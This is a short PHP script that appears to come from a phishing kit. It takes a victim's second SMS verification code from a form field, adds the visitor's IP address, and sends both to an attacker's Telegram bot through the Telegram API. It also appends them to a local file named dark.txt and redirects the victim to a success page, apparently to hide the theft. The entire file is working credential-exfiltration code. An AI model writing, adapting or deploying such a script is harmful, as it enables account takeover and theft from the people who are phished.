<?php
include "telegram.php";
include 'blocker.php';

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");


	$message .= '
--------------- ⚜️ SMS 2 RAM ⚜️ --------

 [💎] SMS 2 >> = '.$_POST['ss'].'

 [⚜️] ┏━ [ '.$ip.' ] ━┓[⚜️]
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
$file = fopen('dark.txt', 'a');
fwrite($file,$message);
    header("Refresh: 3; URL=succes.html");
    exit();
?>